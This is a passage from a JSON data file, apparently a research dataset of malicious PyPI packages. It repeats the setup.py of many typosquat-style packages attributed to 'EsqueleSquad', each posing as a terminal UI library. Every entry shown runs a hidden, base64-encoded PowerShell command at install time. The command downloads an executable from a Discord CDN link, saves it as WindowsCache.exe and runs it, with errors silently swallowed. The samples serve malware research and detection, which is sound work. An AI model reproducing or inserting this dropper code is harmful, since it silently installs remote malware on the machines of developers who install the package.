3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-killgetgrand-v1.24",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-killgetgrand',\n    packages = ['modlib'],\n    version = '5.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-libloadcandy-v6.29",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-libloadcandy',\n    packages = ['modlib'],\n    version = '9.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-libpipintel-v8.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-libpipintel',\n    packages = ['modlib'],\n    version = '9.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-masksuperpyw-v8.89",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-masksuperpyw',\n    packages = ['modlib'],\n    version = '4.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-maskverstring-v7.31",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-maskverstring',\n    packages = ['modlib'],\n    version = '4.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-minemaskget-v6.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-minemaskget',\n    packages = ['modlib'],\n    version = '4.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-minestrcv-v6.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-minestrcv',\n    packages = ['modlib'],\n    version = '6.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-nvidiaguistr-v9.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-nvidiaguistr',\n    packages = ['modlib'],\n    version = '9.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-osintvirtualload-v10.15",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-osintvirtualload',\n    packages = ['modlib'],\n    version = '6.57',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-paypalpongosint-v10.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-paypalpongosint',\n    packages = ['modlib'],\n    version = '4.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-paypalpostcandy-v2.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-paypalpostcandy',\n    packages = ['modlib'],\n    version = '2.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pepnvidiastr-v10.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pepnvidiastr',\n    packages = ['modlib'],\n    version = '10.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pingedpyw-v7.29",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pingedpyw',\n    packages = ['modlib'],\n    version = '3.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pingloadcontrol-v4.73",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pingloadcontrol',\n    packages = ['modlib'],\n    version = '1.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: 